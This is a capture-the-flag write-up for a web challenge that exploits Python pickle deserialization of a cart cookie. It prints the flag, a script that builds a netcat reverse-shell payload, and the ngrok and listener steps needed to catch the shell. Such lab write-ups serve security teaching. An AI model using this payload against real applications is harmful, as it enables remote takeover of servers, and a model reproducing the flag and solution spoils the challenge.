A serial killer has decided to sell all his victims' possessions on this website. Hack it before he sells any of the items!

300pts(hard)
ApoorvCTF{c0Ngr47S_y0u_ArE_A_Ser1A1_KI11er}
hint cost: 50pts
hint: try to find where the cart items of the user are stored
web exploiation
#web

Writeup:
Challenge name and description suggests that this a deserialization vulnerability involving the pickle module from python.
Upong accessing and using the site we see that cart items are somehow stored in a cookie in a serialized base64 encoded form.
When serialized objects are deserialized they are initialized and instantiated using some pre defined methods before being used later on in the code.
One such method is the __reduce__() method which we can alter for our purpose.
So we can create an object with a malicious __reduce__() method which would essentially be a reverse shell payload.
Here, we are going to use a netcat reverse shell payload.

Script to generate our malicious serialized cart value:

import pickle, base64, os

class payload(object):
    def __reduce__(self):
        return (os.system, (f'nc -nv <your ip> <port> -e /bin/bash',))

deserialpayload = payload()
serialpayload = pickle.dumps(deserialpayload)
print(base64.b64encode(serialpayload))

Now to provide our ip, we need to use port forwarding using ngrok since we are connected to the internet using a router and only the router's ip is visible to the internet.
First setup a netcat listener using nc -nvlp 1234
Now, after installing and setting up ngrok, execute ngrok tcp 1234 which would basically forward our local tcp port 1234 to an external port directly accessible from the internet.
Note down the domain name of the external address and the port given by ngrok for our use.
Now, execute ping <domain name> to find the ip address of that domain name. (You can use any other method to find the domain name)
Now put this ip address in place of "<your ip>" and the port we got from ngrok in place of <port> in the python script.
Execute it to get the serialized cart value and set it as your cookie.
Now click on Cart on the website and voila you have a shell!
